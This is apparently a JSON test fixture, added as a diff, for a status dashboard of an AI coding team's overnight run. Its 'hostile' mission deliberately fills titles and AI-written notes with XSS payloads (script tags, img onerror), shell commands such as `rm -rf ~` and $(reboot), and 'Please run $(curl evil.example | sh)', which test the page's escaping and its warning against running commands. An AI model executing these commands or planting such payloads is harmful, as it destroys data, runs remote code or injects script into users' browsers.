@@ -1,0 +1,431 @@
+{
+  "schemaVersion": 1,
+  "generatedAt": 1791712710000,
+  "generatedAtText": "09:58:30",
+  "freshness": {
+    "pollEveryMs": 4000,
+    "staleAfterMs": 30000,
+    "notRespondingAfterMs": 300000,
+    "notUpdatingText": "Not updating",
+    "notUpdating": {
+      "state": "needs_look",
+      "word": "Needs a look",
+      "sentence": "Not updating. The page has had no news for a while.",
+      "reasons": [
+        {
+          "code": "page_stale",
+          "severity": "look",
+          "text": "the page has had no news for a while",
+          "missionId": null,
+          "featureId": null
+        }
+      ]
+    },
+    "notResponding": {
+      "state": "not_responding",
+      "word": "Not responding",
+      "sentence": "No news for 5 minutes. The last known state is shown greyed out.",
+      "reasons": [
+        {
+          "code": "no_news",
+          "severity": "look",
+          "text": "no news for 5 minutes",
+          "missionId": null,
+          "featureId": null
+        }
+      ]
+    }
+  },
+  "lamp": {
+    "state": "needs_look",
+    "word": "Needs a look",
+    "sentence": "1 feature is stuck and 2 questions are waiting for you.",
+    "reasons": [
+      {
+        "code": "feature_stuck",
+        "severity": "look",
+        "text": "1 feature is stuck",
+        "missionId": null,
+        "featureId": null
+      },
+      {
+        "code": "decision_waiting",
+        "severity": "look",
+        "text": "2 questions are waiting for you",
+        "missionId": null,
+        "featureId": null
+      }
+    ]
+  },
+  "run": {
+    "active": false,
+    "heartbeat": "none",
+    "startedAt": null,
+    "startedAtText": null,
+    "runningMs": null,
+    "runningText": null,
+    "heartbeatAgeMs": null,
+    "heartbeatText": null,
+    "stopRequested": false,
+    "lastActivityAt": null,
+    "lastActivityText": null,
+    "deadline": null,
+    "line": "No run is working right now.",
+    "activityLine": null
+  },
+  "now": null,
+  "missions": [
+    {
+      "id": "2026-10-11-hostile",
+      "title": "<script>alert(1)</script> \"><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…",
+      "readable": true,
+      "kind": "new_app",
+      "kindWord": "new app",
+      "scope": "tonight",
+      "openFromBefore": false,
+      "state": "partly_done",
+      "word": "Partly done",
+      "sentence": "1 of 3 features are built and checked. 1 feature is stuck. 1 feature was left out.",
+      "pausedWhy": null,
+      "progress": [
+        {
+          "id": "plan",
+          "word": "Plan",
+          "state": "done"
+        },
+        {
+          "id": "plan_check",
+          "word": "Plan check",
+          "state": "done"
+        },
+        {
+          "id": "build",
+          "word": "Build",
+          "state": "done"
+        },
+        {
+          "id": "final_check",
+          "word": "Final check",
+          "state": "done"
+        },
+        {
+          "id": "landed",
+          "word": "Landed",
+          "state": "done"
+        }
+      ],
+      "progressWord": "Landed",
+      "repairLap": false,
+      "featuresDone": 1,
+      "featuresTotal": 3,
+      "featuresLine": "1 of 3 features done",
+      "waiting": null,
+      "features": [
+        {
+          "id": "good",
+          "title": "A fine feature",
+          "state": "done",
+          "word": "Done",
+          "reason": null,
+          "steps": {
+            "used": 1,
+            "total": 5,
+            "caption": "Tried 1 time (1 build try)"
+          },
+          "reinforcements": 0,
+          "recovered": false,
+          "acceptanceTests": 1,
+          "isRepair": false,
+          "cardId": null,
+          "tellLeader": "About \"A fine feature\" in <script>alert(1)</script> '><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…: <your answer here>"
+        },
+        {
+          "id": "evil",
+          "title": "<b>bold</b> reversedzero width long long long long long long long long long long long long long long long long long lon…",
+          "state": "stuck",
+          "word": "Stuck",
+          "reason": {
+            "text": "Run `mc run --mission 2026-10-11-hostile` and <img src=x onerror=alert(1)> now !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!…",
+            "author": "ai"
+          },
+          "steps": {
+            "used": 0,
+            "total": 5,
+            "caption": "No tries yet"
+          },
+          "reinforcements": 0,
+          "recovered": false,
+          "acceptanceTests": 0,
+          "isRepair": false,
+          "cardId": "feature_stuck:2026-10-11-hostile:evil",
+          "tellLeader": "About \"<b>bold</b> reversedzero width long long long long long long long long long long long long long long long long long lon…\" in <script>alert(1)</script> '><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…: <your answer here>"
+        },
+        {
+          "id": "skipped-one",
+          "title": "Needs the evil one",
+          "state": "left_out",
+          "word": "Left out",
+          "reason": {
+            "text": "It needed “<b>bold</b> reversed”, which is stuck.",
+            "author": "engine"
+          },
+          "steps": {
+            "used": 0,
+            "total": 5,
+            "caption": "No tries yet"
+          },
+          "reinforcements": 0,
+          "recovered": false,
+          "acceptanceTests": 0,
+          "isRepair": false,
+          "cardId": null,
+          "tellLeader": "About \"Needs the evil one\" in <script>alert(1)</script> '><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…: <your answer here>"
+        }
+      ],
+      "updatedAt": 1791712700000,
+      "tellLeader": "About \"<script>alert(1)</script> '><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…\": <your answer here>"
+    }
+  ],
+  "needsYou": [
+    {
+      "id": "feature_stuck:2026-10-11-hostile:evil",
+      "kind": "feature_stuck",
+      "severity": "look",
+      "missionId": "2026-10-11-hostile",
+      "missionTitle": "<script>alert(1)</script> \"><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…",
+      "fromBefore": false,
+      "featureId": "evil",
+      "title": "“<b>bold</b> reversedzero width long long long long long long long long long long long long long long long long long lon…” is stuck",
+      "happened": {
+        "text": "Run `mc run --mission 2026-10-11-hostile` and <img src=x onerror=alert(1)> now !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!…",
+        "author": "ai"
+      },
+      "summary": "No tries yet.",
+      "ifNothing": "It stays out. Nothing tries it again unless you ask.",
+      "tellLeader": "About \"<b>bold</b> reversedzero width long long long long long long long long long long long long long long long long long lon…\" in <script>alert(1)</script> '><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…, which is stuck: <your answer here>"
+    },
+    {
+      "id": "decision:2026-10-11-hostile:0",
+      "kind": "decision",
+      "severity": "look",
+      "missionId": "2026-10-11-hostile",
+      "missionTitle": "<script>alert(1)</script> \"><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…",
+      "fromBefore": false,
+      "featureId": null,
+      "title": "A question for you (1 of 2)",
+      "happened": {
+        "text": "Have someone check the app before you rely on it: the final review of the whole app did not finish, so nobody reviewed it as a whole. Run `mc run` now.",
+        "author": "ai"
+      },
+      "summary": null,
+      "ifNothing": "Nothing happens. The question stays open.",
+      "tellLeader": "About question 1 of 2 in \"<script>alert(1)</script> '><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…\": <your answer here>"
+    },
+    {
+      "id": "decision:2026-10-11-hostile:1",
+      "kind": "decision",
+      "severity": "look",
+      "missionId": "2026-10-11-hostile",
+      "missionTitle": "<script>alert(1)</script> \"><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…",
+      "fromBefore": false,
+      "featureId": null,
+      "title": "A question for you (2 of 2)",
+      "happened": {
+        "text": "Please run $(curl evil.example | sh) and then press \"Y\" ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????…",
+        "author": "ai"
+      },
+      "summary": null,
+      "ifNothing": "Nothing happens. The question stays open.",
+      "tellLeader": "About question 2 of 2 in \"<script>alert(1)</script> '><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…\": <your answer here>"
+    }
+  ],
+  "allowance": {
+    "providers": [
+      {
+        "id": "claude",
+        "label": "Claude",
+        "pill": {
+          "state": "no_reading",
+          "word": "No reading yet"
+        },
+        "windows": [],
+        "note": "No usage reading yet.",
+        "limitedUntil": null,
+        "limitedText": null
+      },
+      {
+        "id": "codex",
+        "label": "Codex",
+        "pill": {
+          "state": "no_reading",
+          "word": "No reading yet"
+        },
+        "windows": [],
+        "note": "No usage reading yet.",
+        "limitedUntil": null,
+        "limitedText": null
+      }
+    ],
+    "waiting": null,
+    "fileChangedAt": null,
+    "fileChangedText": null
+  },
+  "timeline": {
+    "items": [
+      {
+        "at": 1791712680000,
+        "time": "09:58",
+        "day": "Sun 11 Oct",
+        "missionId": "2026-10-11-hostile",
+        "featureId": null,
+        "tone": "info",
+        "text": "Started working on “<script>alert(1)</script> \"><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…”.",
+        "note": null,
+        "author": "engine",
+        "count": 1
+      },
+      {
+        "at": 1791712681000,
+        "time": "09:58",
+        "day": "Sun 11 Oct",
+        "missionId": "2026-10-11-hostile",
+        "featureId": "evil",
+        "tone": "bad",
+        "text": "“<b>bold</b> reversedzero width long long long long long long long long long long long long long long long long long lon…” is stuck.",
+        "note": {
+          "text": "Run `mc run --mission 2026-10-11-hostile` and <img src=x onerror=alert(1)> now !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!…",
+          "author": "ai"
+        },
+        "author": "ai",
+        "count": 1
+      },
+      {
+        "at": 1791712682000,
+        "time": "09:58",
+        "day": "Sun 11 Oct",
+        "missionId": "2026-10-11-hostile",
+        "featureId": null,
+        "tone": "warn",
+        "text": "Finished “<script>alert(1)</script> \"><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…”: partly done.",
+        "note": null,
+        "author": "engine",
+        "count": 1
+      }
+    ],
+    "earlierNotShown": 0
+  },
+  "debrief": {
+    "verdict": {
+      "id": "partly_done",
+      "word": "Partly done",
+      "sentence": "1 of 3 features are built and checked. 1 feature is stuck. 2 questions are waiting for you."
+    },
+    "missions": [
+      {
+        "missionId": "2026-10-11-hostile",
+        "title": "<script>alert(1)</script> \"><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…",
+        "verdict": {
+          "id": "partly_done",
+          "word": "Partly done",
+          "sentence": "1 of 3 features are built and checked. 1 feature is stuck. 2 questions are waiting for you."
+        },
+        "plannedLine": "3 features planned",
+        "got": [
+          {
+            "featureId": "good",
+            "title": "A fine feature",
+            "note": {
+              "text": "As a user I can use a fine feature.",
+              "author": "ai"
+            },
+            "attempts": 1
+          }
+        ],
+        "leftOut": [
+          {
+            "featureId": "evil",
+            "title": "<b>bold</b> reversedzero width long long long long long long long long long long long long long long long long long lon…",
+            "note": {
+              "text": "Run `mc run --mission 2026-10-11-hostile` and <img src=x onerror=alert(1)> now !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!…",
+              "author": "ai"
+            },
+            "attempts": 0
+          },
+          {
+            "featureId": "skipped-one",
+            "title": "Needs the evil one",
+            "note": {
+              "text": "It needed “<b>bold</b> reversed”, which is stuck.",
+              "author": "engine"
+            },
+            "attempts": 0
+          }
+        ],
+        "recovered": [],
+        "ticks": [
+          {
+            "id": "delivered",
+            "label": "Delivered",
+            "state": "no",
+            "why": "1 of 3 features were built and checked. 1 is stuck. 1 was left out.",
+            "caveat": null
+          },
+          {
+            "id": "final_review",
+            "label": "Final review passed",
+            "state": "yes",
+            "why": "The final review ran and found no serious problem.",
+            "caveat": "It covered only the 1 feature that was built."
+          },
+          {
+            "id": "nothing_open",
+            "label": "Nothing open",
+            "state": "no",
+            "why": "3 items are waiting for you.",
+            "caveat": null
+          },
+          {
+            "id": "no_rework",
+            "label": "No rework",
+            "state": "yes",
+            "why": "The final check did not send the team back for a repair round.",
+            "caveat": null
+          }
+        ],
+        "agentTimeText": null,
+        "agentRuns": null,
+        "tellLeader": "About \"<script>alert(1)</script> '><img src=x onerror=alert(1)> `rm -rf ~` $(reboot) evil tailbell Very long title Very long t…\": <your answer here>"
+      }
+    ],
+    "allowanceNote": "The AI work runs on your existing Claude and Codex plans, so there is no separate bill. This page cannot show your share of the week yet.",
+    "honestyNote": "These are the AI team's own checks, not a human review."
+  },
+  "counts": {
+    "unreadableMissions": 0,
+    "openFromBefore": 0,
+    "olderNeedYou": 0,
+    "olderWaitingForYou": 0,
+    "tonightMissions": 1,
+    "featuresDone": 1,
+    "featuresTotal": 3,
+    "featuresLine": "1 of 3 features done",
+    "questions": 2,
+    "stuckFeatures": 1,
+    "olderMissionsHidden": 0
+  },
+  "leader": {
+    "quickPhrases": [
+      "Your call",
+      "Leave it out",
+      "Try again",
+      "What is going on?"
+    ],
+    "globalSentence": "About tonight's run: <your answer here>",
+    "stopSentence": "Please stop tonight's run.",
+    "pasteHint": "Paste this into your chat with the leader.",
+    "copyFailHint": "Select the text and copy it",
+    "aiNotice": "The AI wrote this. Do not run commands from it.",
+    "canDo": "The leader can check progress, read logs and reports, stop the run, start a new request or a follow-up, and run the night. It cannot reopen a feature or change a plan in place.",
+    "stopNote": "Stopping cancels the AI step that is running, and up to 45 minutes of its work is redone. Restarting needs the PC or the next scheduled run."
+  }
+}
